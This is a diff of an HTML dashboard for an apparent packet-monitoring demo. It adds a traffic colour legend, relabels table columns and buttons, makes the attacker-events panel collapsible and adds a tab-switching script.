+          <!-- Protocol Explorer Color Legend -->
+          <span class="pe-packet-legend" aria-label="Packet Colour Key">
+            <span class="pe-legend-item"><i class="pe-step-dot green"></i>Normal</span>
+            <span class="pe-legend-item"><i class="pe-step-dot blue"></i>Blocked</span>
+            <span class="pe-legend-item"><i class="pe-step-dot amber"></i>MitM / Warn</span>
+            <span class="pe-legend-item"><i class="pe-step-dot red"></i>Attack</span>
+          </span>
         </div>
 
         <div class="stream-controls">
@@ -636,10 +732,10 @@
           </div>
 
           <button id="btn-toggle-autoscroll" class="cyber-btn btn-sm active">
-            AUTO-SCROLL [ON]
+            ▶ AUTO-SCROLL [ON]
           </button>
           <button id="btn-clear-table" class="cyber-btn btn-sm">
-            CLEAR VIEW
+            RESET
           </button>
         </div>
       </div>
@@ -649,31 +745,34 @@
         <table class="packet-table" id="packet-table">
           <thead>
             <tr>
-              <th width="110">TIME</th>
-              <th width="80">METHOD</th>
+              <th width="115">TIME</th>
+              <th width="85">METHOD</th>
               <th>ENDPOINT</th>
               <th width="90">STATUS</th>
-              <th width="100">LATENCY</th>
-              <th width="140">CLIENT IP</th>
-              <th width="150">CLASSIFICATION</th>
+              <th width="95">LATENCY</th>
+              <th width="140">SOURCE IP</th>
+              <th width="160">CLASSIFICATION</th>
               <th width="110">DEFENSE</th>
-              <th width="180">PAYLOAD SUMMARY</th>
+              <th width="200">INFO / PAYLOAD</th>
             </tr>
           </thead>
           <tbody id="packet-table-body">
-            <!-- Dynamic rows will be inserted here -->
             <tr class="empty-row">
-              <td colspan="9">Waiting for telemetry stream from Target App (POST /api/telemetry)...</td>
+              <td colspan="9">No packets on the wire yet.</td>
             </tr>
           </tbody>
         </table>
       </div>
     </section>
 
-    <section class="card attack-events-card">
-      <div class="card-header"><div class="card-title">ATTACKER · RUN EVENTS</div></div>
+    <!-- Collapsible Attacker Run Events Drawer -->
+    <details class="card attack-events-card">
+      <summary class="card-header attack-events-summary">
+        <span class="card-title">ATTACKER · REAL RUN EVENTS</span>
+        <span class="badge badge-shield inactive">CLICK TO EXPAND</span>
+      </summary>
       <div id="attack-events" aria-live="polite">Chưa nhận sự kiện Attacker.</div>
-    </section>
+    </details>
   </main>
 
   <!-- Modal for inspecting full telemetry JSON payload -->
@@ -692,11 +791,26 @@
 
   <!-- Socket.io Client Library -->
   <script src="/socket.io/socket.io.js"></script>
-  <!-- Fallback CDN in case served standalone -->
   <script>
     if (typeof io === 'undefined') {
       document.write('<script src="https://cdn.socket.io/4.8.1/socket.io.min.js"><\/script>');
     }
+    // Workspace Tab Switcher (Preserves all DOM elements & triggers canvas resize)
+    document.addEventListener('DOMContentLoaded', () => {
+      const tabs = document.querySelectorAll('.pe-ws-tab[data-ws-target]');
+      tabs.forEach((tab) => {
+        tab.addEventListener('click', () => {
+          const target = tab.getAttribute('data-ws-target');
+          document.body.setAttribute('data-active-workspace', target);
+          tabs.forEach((t) => {
+            const active = t === tab;
+            t.classList.toggle('is-active', active);
+            t.setAttribute('aria-selected', active ? 'true' : 'false');
+          });
+          window.dispatchEvent(new Event('resize'));
+        });
+      });
+    });
   </script>
   <script src="app.js"></script>
 </body>
